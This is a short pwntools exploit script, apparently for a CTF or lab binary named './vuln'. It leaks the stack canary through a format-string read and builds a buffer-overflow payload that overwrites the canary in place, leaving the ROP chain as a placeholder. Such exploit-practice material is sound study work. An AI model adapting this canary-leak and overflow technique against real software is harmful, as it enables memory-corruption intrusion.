from pwn import *

#canary is 15
#libc is 17

p = process("./vuln")

p.recvuntil(b": ")
p.sendline(b"%15$lx")
p.recvline()
canary = int(p.recvline().strip(), 16)
log.success("Canary leaked: " + hex(canary))
pause()

#With pause and we can check on gdb at main+127 the new value of RDX and we can see the canary or our buffer
#so we can find the offset to overwrite the canary

payload = b"A"*72 + p64(canary) + b"B"*8 + b"INSERT ROP HERE"
p.recvuntil(b": \n")
p.sendline(payload)
print(p.recvline())